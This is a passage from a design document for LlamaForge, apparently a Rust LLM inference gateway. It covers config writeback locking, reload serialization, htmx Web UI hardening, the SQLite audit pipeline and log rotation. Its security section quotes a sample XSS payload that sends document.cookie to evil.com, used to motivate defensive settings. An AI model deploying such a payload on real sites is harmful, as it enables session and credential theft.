> **Blocking I/O Justification:** `flock(2)` and `fsync(2)` are synchronous, blocking system calls. `flock` can block indefinitely if another process holds the lock. `fsync` forces a physical disk flush — on network-attached storage (AWS EBS, GCE PD) or saturated local disks, this can block for hundreds of milliseconds to seconds. If these calls run on a Tokio worker thread, they starve the async reactor: all concurrent HTTP/gRPC token streaming stalls, queue dispatch freezes, and clients see spurious read timeouts. Wrapping the entire `flock` → read → truncate → `write_all` → `fsync` → unlock sequence in `tokio::task::spawn_blocking` moves it to Tokio's dedicated blocking thread pool, leaving the worker threads free for async I/O.
>
> ```rust
> // In the axum handler — after the runtime change succeeds:
> let config_path = config_path.clone();
> let lock_path = lock_path.clone();
> let mutation = mutation.clone();
> let diff = tokio::task::spawn_blocking(move || -> Result<ConfigDiff, WritebackError> {
>     // Acquire exclusive flock — may block if another writeback is in progress.
>     let lock_file = std::fs::OpenOptions::new()
>         .create(true).write(true).open(&lock_path)?;
>     flock(lock_file.as_raw_fd(), FlockArg::LockExclusive)?;
>
>     // Read-modify-write with rollback snapshot.
>     let original = std::fs::read_to_string(&config_path)?;
>     let rollback = original.clone();
>     let mut config: toml::Value = toml::from_str(&original)?;
>     let diff = apply_mutation(&mut config, &mutation);
>     let new_toml = toml::to_string_pretty(&config)?;
>
>     // Phase 1: Try atomic write-to-temp-then-rename (crash-safe).
>     let tmp_path = state_dir.join("config.tmp");
>     std::fs::write(&tmp_path, new_toml.as_bytes())?;
>     std::fs::File::open(&tmp_path)?.sync_all()?; // fsync temp file
>     match std::fs::rename(&tmp_path, &config_path) {
>         Ok(()) => { /* atomic — crash-safe */ }
>         Err(e) if e.raw_os_error() == Some(libc::EXDEV)
>              || e.raw_os_error() == Some(libc::EACCES) => {
>             // Phase 2: Fallback to in-place truncation (rootless / cross-device).
>             let _ = std::fs::remove_file(&tmp_path); // clean up temp
>             let file = std::fs::OpenOptions::new()
>                 .write(true).truncate(true).open(&config_path)?;
>             use std::io::Write;
>             let mut writer = std::io::BufWriter::new(file);
>             if let Err(write_err) = writer.write_all(new_toml.as_bytes())
>                 .and_then(|_| writer.get_ref().sync_all()) {
>                 // Write failed — restore rollback snapshot.
>                 let _ = std::fs::write(&config_path, rollback.as_bytes());
>                 return Err(write_err.into());
>             }
>         }
>         Err(e) => return Err(e.into()),
>     }
>     // flock released on lock_file Drop
>     Ok(diff)
> }).await??;
> ```

> **Why a separate state directory for the lock file?** Two earlier designs were rejected:
> - **Locking the config file itself** creates a subtle race with in-place truncation: if process A holds `flock()` on the config file descriptor while process B opens the same path for a read, B gets a valid fd. But if A truncates and rewrites between B's `open()` and `read()`, B may read partial content. A dedicated lock file avoids this — all writers acquire the lock *before* opening the config file, serializing both reads and writes.
> - **Adjacent sidecar lock file** (`llamaforge.toml.lock` next to the config) fails on Kubernetes: ConfigMaps are mounted as read-only symlink directories. The `open(..., O_CREAT)` call for the lock file immediately fails with `EROFS` (Read-only file system), crashing the API endpoint. It also fails in rootless deployments where the config directory is owned by root (same `EACCES` issue as `rename()`).
>
> The lock file is placed in the LlamaForge state directory (`/var/run/llamaforge/` by default, configurable via `$LLAMAFORGE_STATE_DIR` or `state_dir` in the TOML), which is always a writable volume (an `emptyDir` in Kubernetes, a host path in Docker Compose). The lock file is created on first use (`O_CREAT`) and is never renamed or replaced, so its inode is stable and `flock()` provides genuine mutual exclusion.
>
> **Local filesystem requirement:** The state directory MUST reside on a local filesystem — not NFS, AWS EFS, or other network-attached storage. `flock(2)` provides reliable mutual exclusion only on local filesystems. On NFSv3, `flock` is emulated via NLM byte-range locks, which fail silently on network partition, server restart, or mounts with `nolock`. On NFSv4, native locking is more reliable but subject to failover races. On AWS EFS (NFSv4.1), file locking is explicitly documented as advisory with known race conditions under concurrent multi-client access. If the state directory must be shared across processes (e.g., for horizontal scaling experiments), use an external coordination mechanism (e.g., etcd lease) rather than relying on `flock` over a network filesystem.

This ensures that: (a) a container restart recovers the exact runtime state from the TOML, (b) the operator's Git-versioned config reflects reality (they can `git diff` to see API-driven changes), and (c) there is no divergence between runtime and declarative state.

> **Startup safety:** If a config file (`llamaforge.toml` or `priority_rules.toml`) is found to be empty or unparseable at startup (e.g., due to a crash during the writeback window), LlamaForge logs a descriptive error including the parse error details and the file path, then exits with a non-zero status code. It does NOT attempt to run with a partial or default config — this would silently start servers with wrong parameters. The operator must restore the file from version control, deployment manifest, or backup.

> **Config format backward compatibility:** All config struct fields MUST have `#[serde(default)]` annotations to ensure backward compatibility with older config files. A config file written for v1.0 must be valid for all future versions — missing fields get sensible defaults via Rust's `Default` trait. There is no `config_version` field in the TOML because `serde(default)` handles version skew naturally: new fields added in v1.1 are simply absent in v1.0 config files and silently default.

> **Conflict resolution:** If the TOML file is mounted read-only (e.g., Kubernetes ConfigMap), the writeback step fails gracefully — the runtime change is applied to `llama-server` but not persisted. A `config.writeback_failed` warning is logged, and the Web UI displays a banner indicating that runtime state has diverged from the config file. On the next restart, the TOML takes precedence.

**Rationale:** At the 2-4 GPU scale where LlamaForge operates, operators manage configuration through Docker Compose, Ansible, Kubernetes ConfigMaps, or version-controlled files. Persisting API mutations back to TOML ensures that the mounted config file always dictates the recovery state — including any runtime changes made via the API.

**Config reload sequence:**

> **Serialization guarantee:** The entire reload operation (Steps 1-5) is serialized by a **`tokio::sync::Mutex<()>`** (the "reload mutex"). This prevents interleaving when two rapid SIGHUPs arrive: the second reload awaits the mutex until the first reload completes all server lifecycle operations (Steps 3-5). Without this, two concurrent reloads reading the same config could interleave their stop/start operations — e.g., both attempt to stop the same server, or one starts a server that the other is concurrently stopping, leaving servers in inconsistent states. The `flock` on the config lock file only serializes file I/O (Step 1); the reload mutex serializes the entire operation including async server lifecycle management.

> **Atomicity guarantee:** The parsed config struct (containing both `priority_rules.toml` fields and `llamaforge.toml` fields) is swapped atomically via `ArcSwap`. All request-processing code reads a single consistent snapshot per request — there is no window where Prometheus labels use the old `requestor_class` mapping while priority computation uses new rules. The `ArcSwap::store()` call publishes the entire new config as a single pointer swap; readers calling `ArcSwap::load()` see either the old config or the new config, never a mix.

1. **Acquire the reload mutex** (`reload_mutex.lock().await`). If another reload is in progress, this awaits until it completes. Then: the file I/O portion (lock acquisition, TOML read, parse, diff) is offloaded to `tokio::task::spawn_blocking` to prevent blocking a Tokio worker thread. Inside the blocking task: acquire the config lock (`$LLAMAFORGE_STATE_DIR/config.lock`) via `flock(LockExclusive)` and re-read TOML files from disk. **Critical:** `flock()` is a blocking syscall that waits indefinitely if the lock is held by a concurrent Web UI writeback. Running it on a Tokio worker thread would reduce the available thread pool by 1 (typically 4-8 threads); multiple SIGHUPs during a writeback stall could deadlock the entire runtime. The `spawn_blocking` wrapper moves the wait to Tokio's dedicated blocking thread pool, which auto-grows and does not starve the async reactor. The blocking task returns the parsed config and diff; server restart/start/stop operations (Steps 3-5 below) execute back on the async context.
2. Diff the new config against the in-memory state. **For fields that support config writeback** (currently: `lora_adapters` per server), the reload performs a **merge-not-replace**: if the TOML file contains the same writeback fields that are currently in memory (i.e., the writeback succeeded earlier), the TOML version wins. If the TOML file is missing writeback fields that exist in memory (i.e., the operator edited the TOML without including recent API mutations), a `config.reload_conflict` warning is logged listing the fields that will be lost, and the TOML version still wins (TOML is authoritative). This prevents a silent wipe of runtime state while ensuring operators can intentionally revert API mutations by editing the TOML.
3. For changed servers: stop → apply new config → restart (respecting graceful shutdown).
4. For new servers: validate and start.
5. For removed servers: graceful shutdown and drain.
6. Release the config lock. Log all config changes as `config.reloaded` events, including any `config.reload_conflict` warnings for writeback fields that were reverted.

SQLite stores only **runtime state** (request metrics, event log, managed process PIDs) — never configuration. The `server_configs` table is retained as a historical audit trail of which config was active at each point in time (snapshots are written on every reload), but it is never read back as authoritative config.

The `llamaforge export-config` CLI command dumps the currently-loaded config to stdout or a file for debugging.

**Technology for Web UI:**

The UI is built with **htmx** + **Alpine.js** for reactivity and **Apache ECharts** for charting, served as embedded static files compiled into the binary. This approach is dramatically simpler to develop and faster to compile than a full Rust→WASM framework like Leptos, while being more than sufficient for a management dashboard. The frontend is a thin presentation layer — all logic lives in the REST management API.

> **Routing Note:** The Web UI uses separate `/ui/partials/*` routes that return HTML fragments for htmx. The `/api/*` endpoints return JSON only. There is no content negotiation — these are distinct route sets. htmx requests hit `/ui/partials/*` and receive pre-rendered HTML; programmatic clients hit `/api/*` and receive JSON.

**Web UI Security:**

htmx amplifies the impact of HTML injection — injected HTML with `hx-*` attributes becomes executable (e.g., `hx-on` evaluates arbitrary JS, `hx-vals` with `js:` prefix evaluates code, `hx-swap-oob` places injected content anywhere in the DOM). The Web UI reflects user-controlled data (model names from config, requestor strings from API clients, request IDs, error messages), so the following mitigations are mandatory:

1. **Auto-escaping template engine:** All `/ui/partials/*` responses are rendered via `minijinja` with auto-escaping enabled by default. Raw HTML output (`|safe` filter) is never used on user-controlled data. This prevents injected HTML from being interpreted by the browser or htmx.
2. **`htmx.config.allowEval = false`:** Set globally in the base HTML template. This disables `hx-on` (inline JS evaluation), `js:` prefixes in `hx-vals`/`hx-headers`, and `eval()`-based trigger filter expressions. Without this, an attacker who can inject `hx-on="click: fetch('https://evil.com?cookie=' + document.cookie)"` into any reflected field gains full XSS.
3. **No user-controlled data in `hx-*` attribute values:** Template authors must never interpolate user data (model names, requestor strings, error messages) into `hx-get`, `hx-post`, `hx-target`, `hx-swap`, or any other `hx-*` attribute. User data appears only in text content and standard HTML attributes (escaped by minijinja).
4. **Content Security Policy:** The Web UI sets `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'` via an axum middleware. No `unsafe-eval` — this provides defense-in-depth even if an escaping gap is introduced. The `unsafe-inline` for styles is required for htmx's inline style mutations (e.g., `hx-indicator`).
5. **Panic isolation:** The Web UI handlers run on the same axum instance as the inference shim (port 8000). A panic in a template rendering path (e.g., `minijinja` filter receiving unexpected input from a corrupt SQLite row) must not crash the inference gateway. LlamaForge requires `panic = "unwind"` in the release profile (Tokio's default panic behavior catches panics at the task boundary, aborting only the panicked task). As defense-in-depth, a `tower::catch_panic` layer is applied to the `/ui/` router sub-group so that Web UI handler panics return HTTP 500 instead of propagating. All Web UI handlers use `Result`-based error handling — `.unwrap()` is prohibited in the rendering path.


### 5.6 Audit Log & Event Store

Every significant event in the system is written to the SQLite event store. This provides a complete audit trail for debugging, billing, capacity planning, and compliance.

> **Event Batching:** Events are accumulated in an in-memory ring buffer and flushed to SQLite in batches of 100 every 100ms. This amortizes per-insert overhead and reduces WAL lock contention under high throughput. If the ring buffer fills (capacity: 10,000 events), the oldest unflushed events are dropped and a `events.buffer_overflow` warning is logged.

> **Sync/Async Boundary:** `rusqlite` is a synchronous FFI binding — calling `conn.execute_batch()` blocks the calling OS thread. To avoid stalling the Tokio async reactor (which would cause gRPC keepalive drops, queue timeout drift, and streaming latency spikes), the SQLite writer runs on a **dedicated `std::thread`**. The event batch pipeline is:
>
> The pipeline uses **two channels** to the dedicated writer thread, with different reliability guarantees:
>
> 1. **Telemetry channel** (lossy, `try_send`): Bounded `tokio::sync::mpsc` channel (capacity: 10,000) for ephemeral events (`request.received`, `request.queued`, `server.health_ok`, etc.). If the channel is full, producers drop the event and increment a `llamaforge_events_dropped_total` counter. Dropping telemetry is acceptable — it's observability data, not billing records.
>
> 2. **Audit channel** (backpressured, `.send().await`): Bounded `tokio::sync::mpsc` channel (capacity: 1,000) for billing-critical records (`RequestMetrics` inserts, `request.completed`, `request.failed`). If the channel is full, the producing async task **awaits** until space is available. This ensures billing-critical records are never silently lost.
>
> **Critical: GPU slot release before audit write.** The proxy task MUST release the downstream `llama-server` slot (by dropping the `reqwest::Response` handle and removing from the dispatch tracking set) **before** awaiting the audit channel send. The audit write is then performed in a detached `tokio::spawn` task:
>
> ```rust
> // 1. Stream complete — release hardware immediately
> drop(response_handle);             // Closes TCP connection, frees llama-server slot
> dispatch_token.release();          // Removes from dispatch tracker (DashSet + AtomicU32 — see DispatchToken in Section 10)
> scheduler.notify_slot_available(); // Wake the scheduler to dispatch next queued request
>
> // 2. Write audit record asynchronously — backpressure cannot stall GPU slots
> let audit_tx = audit_tx.clone();
> tokio::spawn(async move {
>     // [AP-4] Timeout prevents unbounded await if writer thread is stalled
>     match tokio::time::timeout(Duration::from_secs(10), audit_tx.send(metrics_record)).await {
>         Ok(Ok(())) => {},
>         Ok(Err(_)) => tracing::error!("Audit channel closed — metrics record lost"),
>         Err(_) => {
>             tracing::warn!("Audit send timed out (10s) — record dropped");
>             AUDIT_RECORDS_DROPPED.inc(); // llamaforge_audit_records_dropped_total
>         }
>     }
> });
> ```
>
> This decoupling ensures that a SQLite writer stall (e.g., during a WAL checkpoint or disk I/O spike) cannot hold GPU slots hostage. Without this separation, the `.send().await` on the audit channel would block the proxy task, which would keep the `reqwest` connection handle alive, preventing `llama-server` from freeing the physical slot for the next request. A disk stall would effectively paralyze inference hardware — the system's most expensive and constrained resource.
>
> The trade-off: if the audit channel is full and the detached task awaits, the `RequestMetrics` record lives in the spawned task's memory until the channel drains. Under sustained write contention, this means up to `1,000` (channel capacity) + `N` (in-flight spawned tasks) records buffered in memory. If the writer thread is permanently stalled, these tasks accumulate until the channel is drained or LlamaForge is restarted. A `llamaforge_audit_channel_pending` gauge tracks the current channel occupancy, and an alert fires if it exceeds 80% capacity for more than 30 seconds.
>
> **Channel gauge implementation:** `tokio::sync::mpsc` channels do not natively export their length to Prometheus — there is no callback or integration point. The `llamaforge_audit_channel_pending` gauge is updated by a **dedicated background `tokio::spawn` task** that polls the sender's `.capacity()` method every 5 seconds and computes `channel_size - sender.capacity()` (since `capacity()` returns the number of *available* permits, not the number of *occupied* slots). The same task also updates the `llamaforge_telemetry_channel_pending` gauge for the telemetry channel. This polling approach adds negligible overhead (two atomic reads every 5 seconds) and avoids instrumenting every `send()` call site with gauge increments (which would be error-prone and add overhead to the hot path).
>
> The dedicated writer thread drains both channels (telemetry with lower priority), executes batch inserts, and manages WAL checkpoints. This two-channel model applies to ALL SQLite writes — the telemetry channel handles ephemeral events and config updates, while the audit channel handles billing-critical request metrics. Together they form the only crossing point between the async and synchronous worlds.
>
> **Relationship to the `MetricsStore` trait (Section 13):** The writer thread is an implementation detail of `SqliteMetricsStore`, NOT a separate write path. The batch collector (Section 13.4) calls `MetricsStore::insert_events()` — the async trait boundary. For the SQLite implementation, `insert_events()` bridges to the writer thread via a `WriterCommand` enum + oneshot response pattern: the async method sends the batch to the writer thread's mpsc channel and awaits completion via a oneshot. The writer thread executes the insert on its owned `rusqlite::Connection` and returns the result. This preserves the trait abstraction for backend pluggability (a Postgres implementation calls `sqlx` directly with no writer thread) while maintaining single-writer serialization for SQLite. The two-channel model described above (telemetry + audit) is an optimization within the batch collector that sits upstream of the trait boundary — the batch collector accumulates events from both channels and flushes them through `MetricsStore::insert_events()` in a single batch.
>
> **Writer thread liveness monitoring:** The spawning code retains the writer thread's `JoinHandle`. A background `tokio::spawn` task polls `join_handle.is_finished()` every 10 seconds. If the writer thread exits unexpectedly (panic, unrecoverable SQLite error), the monitor: (1) emits a `tracing::error!` event directly (bypassing the dead channel — this uses the tracing subscriber's stderr fallback, not the audit pipeline), (2) sets a gateway-level degraded flag that surfaces in `/health` and the Web UI, and (3) logs the panic payload if available via `JoinHandle::join()`. Without this monitor, a writer thread panic would silently disconnect both mpsc channels — spawned audit tasks would log send errors, but the `audit_channel_pending` gauge would stop updating, which is ambiguous (could mean "no traffic" or "writer crashed"). The read path (via `deadpool-sqlite`) is unaffected and continues serving Web UI queries.

> **WAL Size Management:** With `PRAGMA journal_mode=WAL`, the WAL file grows indefinitely if a long-running read transaction (e.g., a slow Web UI Request Explorer query) blocks the checkpoint. To prevent unbounded growth:
>
> 1. A periodic Tokio task runs `PRAGMA wal_checkpoint(PASSIVE)` every 60 seconds on the dedicated writer thread (via the same `mpsc` channel used for writes). **`PASSIVE` is used instead of `TRUNCATE`** because `TRUNCATE` completely blocks the executing thread until all active read transactions complete — if a user in the Web UI Request Explorer executes a complex filtering query taking 30 seconds, `TRUNCATE` stalls the writer thread for the entire duration, causing the telemetry channel to drop data and the audit channel to backpressure Tokio tasks. `PASSIVE` checkpoints as many WAL pages as possible without blocking, making it safe to run frequently.
> 2. A `llamaforge_sqlite_wal_size_bytes` Prometheus gauge tracks WAL file size.
> 3. If WAL size exceeds 100 MB, a `sqlite.wal_oversize` warning event is logged and the operator is alerted via the Web UI dashboard. At this point, operators can trigger a blocking checkpoint via the management API:
>    ```
>    POST /api/maintenance/wal-checkpoint
>    Content-Type: application/json
>    {"mode": "truncate"}   // "passive" (default, non-blocking) or "truncate" (blocking, reclaims disk)
>    ```
>    Response:
>    ```json
>    {"status": "ok", "mode": "truncate", "wal_size_before_bytes": 104857600,
>     "wal_size_after_bytes": 0, "pages_checkpointed": 25600, "duration_ms": 142}
>    ```
>    The `truncate` mode blocks the writer thread until all active read transactions complete. The endpoint cancels any in-flight Web UI read queries (via the read pool's statement timeout) before executing the checkpoint to minimize blocking duration. The endpoint requires authentication (same as all `/api/*` management endpoints).
>
>    **Why not SQLite CLI?** The v1 container distribution uses `scratch` or `distroless` base images (Section 12), which contain no shell, no `sqlite3` binary, and no package manager. Even with `debian:bookworm-slim`, the SQLite CLI opens the database file directly, bypassing LlamaForge's connection pool and WAL-mode configuration — concurrent access from the CLI can cause `SQLITE_BUSY` errors or corrupt the WAL index. The management endpoint routes through the existing writer thread, which serializes all mutations correctly.
> 4. Long-running read queries on the HTTP management API use `BEGIN DEFERRED` with a configurable statement timeout (default: 30 seconds) to prevent them from holding read transactions open indefinitely.

> **Runbook — Diagnosing a Bloated WAL:** A growing WAL file is almost always caused by a long-running read transaction blocking checkpoints. To diagnose:
> ```bash
> # Step 1: Attempt a passive (non-blocking) checkpoint via the management API:
> curl -s -X POST http://localhost:8000/api/maintenance/wal-checkpoint \
>   -H 'Content-Type: application/json' -d '{"mode": "passive"}'
> # If pages_checkpointed is 0, a reader is blocking.
>
> # Step 2: Check for open Web UI Request Explorer sessions. The 30-second
> # statement timeout should prevent indefinite blocking, but if a session
> # is holding a read transaction, cycle the read connection pool:
> curl -s -X POST http://localhost:8000/api/config/reload
>
> # Step 3: Retry with a blocking truncate checkpoint to reclaim disk:
> curl -s -X POST http://localhost:8000/api/maintenance/wal-checkpoint \
>   -H 'Content-Type: application/json' -d '{"mode": "truncate"}'
> ```
> The 30-second statement timeout on the read pool (Section 5.6) prevents this in normal operation. All WAL maintenance MUST go through the management API — never access the SQLite file directly with the `sqlite3` CLI, as this bypasses LlamaForge's connection pool and can cause `SQLITE_BUSY` errors or WAL index corruption.

**Read Path (Separate Connection Pool):**

HTTP read queries (`GET /api/metrics/requests`, `GET /api/metrics/aggregated`, Request Explorer UI) execute on a **separate read-only connection pool** managed by `deadpool-sqlite` (or equivalent). Each read query acquires a connection asynchronously, then uses `interact()` to run synchronous `rusqlite` calls on a blocking thread:

```rust
let pool = read_pool.clone();
let conn = pool.get().await?;
let results: Vec<RequestMetrics> = conn.interact(|conn| {
    // CRITICAL: The interact() closure must return OWNED data ('static).
    // rusqlite's prepare() returns a Statement that borrows &conn, and
    // query_map() returns a MappedRows iterator that borrows &Statement.
    // Attempting to return the iterator from the closure fails compilation:
    // the borrow checker enforces that interact() closures return owned data
    // so it can cross the thread boundary back to Tokio.
    //
    // Solution: fully materialize results into an owned Vec inside the closure.
    let mut stmt = conn.prepare("SELECT ... FROM request_metrics WHERE ...")?;
    let rows = stmt.query_map([], |row| {
        Ok(RequestMetrics {
            request_id: row.get(0)?,
            // ... map all fields ...
        })
    })?;
    rows.collect::<Result<Vec<_>, _>>()
}).await;

// CRITICAL: explicitly handle InteractError::Panic.
// The `??` shorthand coerces InteractError::Panic into an opaque HTTP 500,
// leaving no trace of the database thread crash in tracing logs.
let results: Vec<RequestMetrics> = match interact_result {
    Ok(Ok(rows)) => rows,
    Ok(Err(sqlite_err)) => return Err(sqlite_err.into()),  // Normal SQL error
    Err(deadpool_sqlite::InteractError::Panic(panic_payload)) => {
        tracing::error!(
            "SQLite read thread panicked: {:?}",
            panic_payload.downcast_ref::<String>()
        );
        return Err(AppError::internal("database read thread panicked"));
    }
    Err(deadpool_sqlite::InteractError::Aborted) => {
        return Err(AppError::internal("database connection aborted"));
    }
};
```

> **Why `interact()` instead of `spawn_blocking`:** `deadpool-sqlite`'s `Pool::get()` is an `async` function that cannot be called inside a synchronous `spawn_blocking` closure. Attempting to work around this with `Handle::current().block_on()` inside `spawn_blocking` risks Tokio thread starvation and potential panics. The `interact()` method on the pooled connection safely bridges the async/sync boundary — it runs the synchronous closure on a dedicated blocking thread while the connection is already acquired.

SQLite's WAL mode allows concurrent readers alongside the dedicated writer thread without blocking either side. The read pool is configured with:
- `max_size`: 4 connections (sufficient for Web UI + API queries).
- `PRAGMA query_only = ON`: Prevents accidental writes from the read path.
- Statement timeout: 30 seconds (prevents long-running queries from holding read transactions open and blocking WAL checkpoints).

> **[G-8] WAL growth from leaked read transactions:** The read pool MUST include a pre-recycle hook that closes any leaked transactions before returning connections to the pool: `pool.pre_recycle(|conn| conn.execute_batch("ROLLBACK; PRAGMA journal_mode=WAL").ok())`. A connection returned to the pool with an open read transaction (e.g., due to an early return or panic in the `interact()` closure that skips the implicit ROLLBACK) holds a WAL snapshot reference, preventing checkpoint progress. The `ROLLBACK` is a no-op if no transaction is active. The `PRAGMA journal_mode=WAL` re-assertion guards against accidental mode changes from injected `PRAGMA` statements in user-facing query endpoints.

**Event Types:**

| Event | Description |
|-------|-------------|
| `request.received` | A new inference request arrived |
| `request.queued` | Request entered the priority queue |
| `request.dispatched` | Request sent to a llama-server |
| `request.first_token` | First token generated (TTFT measurement point) |
| `request.completed` | Request finished successfully |
| `request.failed` | Request failed (with error detail) |
| `request.evicted` | Request evicted by higher-priority request |
| `request.requeued` | Evicted request re-entered the queue |
| `request.cancelled` | Request cancelled by client or timeout |
| `request.timeout` | Request exceeded queue timeout |
| `server.started` | llama-server process started |
| `server.stopped` | llama-server process stopped |
| `server.health_ok` | Health check passed (logged at debug level) |
| `server.health_fail` | Health check failed |
| `server.restarting` | Automatic restart triggered |
| `server.failed` | Server exceeded max restart attempts |
| `config.updated` | Configuration changed via API or file |
| `eviction.triggered` | Eviction decision made (with details) |

**Structured Logging:**

All events are also written to stdout/stderr in structured JSON format using `tracing` + `tracing-subscriber` with JSON formatting. This enables piping to any log aggregation system (ELK, Loki, CloudWatch, etc.).

**Log Sampling Strategy:**

To manage log volume under high throughput without losing operational visibility:

- **All non-success events** (`request.failed`, `request.evicted`, `request.timeout`, `server.health_fail`, `server.failed`, etc.) are logged at **INFO** level unconditionally.
- **Success events** (`request.completed`) are logged at **DEBUG** level. Operators can enable them via `RUST_LOG=llamaforge::events=debug` or the `log_level` config when per-request audit trail is needed. They are always written to SQLite regardless of log level.
- **`server.health_ok`** events are sampled at **1-per-10-checks** (i.e., logged once every 20 seconds per server instead of every 2 seconds). This reduces health check noise by 90% while still providing a heartbeat signal in logs.
- For production deployments, use **logrotate** (or equivalent) on the log output to prevent unbounded disk growth. A recommended logrotate config: rotate daily, keep 7 days, compress rotated files.

> **Logrotate and file descriptor reload:** `tracing-appender` (and most Rust file-logging crates) opens the log file at startup and writes to the resulting file descriptor for the process lifetime. When `logrotate` renames `llamaforge.log` to `llamaforge.log.1`, the `tracing-appender` continues writing to the **old inode** (now `llamaforge.log.1`) because Unix `rename()` does not invalidate open file descriptors. New log entries silently go to the rotated file while the expected `llamaforge.log` path is either empty or does not exist.
>
> **Preferred approach: use `tracing_appender::rolling` with `Rotation::DAILY` (or `Rotation::NEVER` with external logrotate).** The `tracing-appender` crate's `RollingFileAppender` with `Rotation::DAILY` handles file rotation internally — it checks the date on each write and opens a new file when the rotation boundary is crossed. This eliminates the need for application-level `SIGHUP` log reload entirely. When using external `logrotate` instead, LlamaForge uses `tracing_subscriber::reload::Layer` to hold a reloadable handle. On `SIGHUP`: (1) create a new `tracing_appender::non_blocking()` writer targeting the configured log path, (2) swap it into the reload handle via `reload_handle.reload(new_layer)`, (3) send the old `WorkerGuard` to a blocking task for safe teardown (see below).
>
> **Critical: `tracing-appender` spawns a background writer thread per `NonBlocking` instance.** Two earlier designs were rejected:
> - **Design A (thread leak):** Created a new appender on each `SIGHUP` without joining the old instance's background thread. Repeated `SIGHUP`s leaked OS threads until process exhaustion.
> - **Design B (Tokio panic):** Fixed the thread leak by dropping the `WorkerGuard` inline after the `reload::Layer` swap. `WorkerGuard::drop()` calls `std::thread::JoinHandle::join()` — a synchronous, blocking operation. If the `SIGHUP` handler runs on a Tokio worker thread (which it does — `tokio::signal::unix::signal(SignalKind::hangup())` delivers signals to an async task), `join()` blocks the Tokio reactor, causing an immediate panic: `Cannot block the current thread from within a runtime`. The gateway crashes on log rotation.
>
> The correct pattern is: (a) use `Rotation::DAILY` to avoid manual reload entirely (preferred), or (b) if using external logrotate, the `SIGHUP` handler must **never drop the `WorkerGuard` on a Tokio worker thread**. Instead, it stores the active guard in shared state and sends the old guard to a blocking task on rotation.
>
> **WorkerGuard storage:** The active `WorkerGuard` is stored in an `Arc<std::sync::Mutex<WorkerGuard>>` held in the application state struct alongside the `reload::Handle`. `std::sync::Mutex` is used (not `tokio::sync::RwLock`) because the critical section is sub-microsecond (a pointer swap) and `std::sync::Mutex` does not require `.await` — the `SIGHUP` handler can lock it without yielding the Tokio task. A `tokio::sync::RwLock` would be needlessly heavyweight here and would require the handler to hold the lock across an `.await` point (the `reload()` call), creating a potential deadlock if multiple SIGHUPs arrive in rapid succession.
>
> ```rust
> // Application state (created at startup):
> struct AppState {
>     log_reload_handle: tracing_subscriber::reload::Handle<...>,
>     log_worker_guard: Arc<std::sync::Mutex<WorkerGuard>>,
>     // ... other fields
> }
>
> // In the async SIGHUP handler:
> let (new_non_blocking, new_guard) = tracing_appender::non_blocking(new_file);
> reload_handle.reload(new_non_blocking_layer).unwrap();
> // old_guard must NOT be dropped here — we're on a Tokio worker thread.
> // Swap the guard under the lock, then send the old one to a blocking thread.
> let old_guard = std::mem::replace(&mut *app_state.log_worker_guard.lock().unwrap(), new_guard);
> tokio::task::spawn_blocking(move || drop(old_guard));
> // WorkerGuard::drop() now runs on a dedicated OS thread, safely joining
> // the old writer thread without blocking the Tokio reactor.
> ```
>
> This is verified by a startup integration test that performs 10 rapid SIGHUP cycles and asserts both thread count stability (no leaks) and no Tokio panics (no blocking on worker threads).
>
> **[G-5] WorkerGuard shutdown panic hazard:** The `WorkerGuard` MUST NOT be stored in `AppState` if `AppState` is dropped on a Tokio worker thread during shutdown (which it will be, since `AppState` is held in `Arc` and the last reference is typically dropped inside an async context). The safe patterns are: (a) use `Rotation::DAILY` which requires no guard at all (preferred), or (b) store the `WorkerGuard` in a dedicated `std::thread` (spawned at startup, joined after the Tokio runtime is fully shut down) that outlives the runtime. The `spawn_blocking` approach above handles SIGHUP rotation correctly, but does NOT address the final `WorkerGuard` drop at process exit — if the runtime shuts down before `spawn_blocking` completes, the guard is leaked. The dedicated thread pattern ensures the final flush always completes.

```json
{
  "timestamp": "2026-04-26T10:15:32.123Z",
  "level": "INFO",
  "event": "request.dispatched",
  "request_id": "01J5ABCDEF...",
  "task_type": "code_review",
  "requestor": "ci-pipeline",
  "model": "llama-3.1-8b",
  "server_id": "llama-8b-gpu0",
  "slot_id": 2,
  "queue_wait_ms": 1523,
  "effective_priority": 700,
  "priority_breakdown": {"base": 200, "starvation_boost": 480, "requestor_bonus": 20, "explicit_override": null},
  "routing_scores": {"llama-8b-gpu0": 0.87, "llama-8b-gpu1": 0.62},
  "routing_winner_breakdown": {"slot": 0.30, "kv": 0.15, "queue": 0.12, "affinity": 0.30},
  "drr_override": false
}
```

> **Dispatch decision decomposition:** The `priority_breakdown` and `routing_winner_breakdown` fields enable 3 AM debugging of scheduling decisions from logs alone. Without these, an operator seeing a background request dispatched at priority 700 cannot determine whether the boost came from starvation (expected after long wait) or a misconfigured requestor bonus. Similarly, `routing_scores` shows all candidate servers and their scores — not just the winner — revealing *why* a particular server was chosen (affinity? load balance? only one with free slots?). The `drr_override` flag indicates when DRR fair-share logic overrode normal priority ordering, explaining cases where a lower-priority request dispatches ahead of a higher-priority one. These fields add ~200 bytes per event (~20KB/s at 100 req/s) — negligible for SQLite. For high-throughput deployments, the decomposition fields can be gated behind `TRACE` level to reduce log volume.

---

## 6. Data Models

### 6.1 Core Types (Rust)

```rust
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// Unique request identifier (UUIDv7 for time-ordered sorting)
/// NOTE: UUIDv7 depends on monotonic clock. NTP corrections or VM migrations
/// that cause clock jumps can break ordering guarantees. The `uuid` crate v7
/// implementation uses a monotonic counter within the same millisecond to
/// mitigate this, but cross-millisecond backward jumps are not handled.
/// For strict ordering in v2, consider a hybrid logical clock (HLC).
///
/// [G-15] Audit queries MUST sort by `timestamp` column (wall-clock from request
/// receipt), NOT by `request_id` lexicographic order. UUIDv7's embedded timestamp
/// is monotonic only within a single process without clock adjustments — VM
/// suspend/resume or NTP step corrections produce non-monotonic UUIDs. The
/// `timestamp` column is populated from `SystemTime::now()` at admission and is
/// the authoritative ordering key for all time-range queries in the Web UI and API.
type RequestId = Uuid;

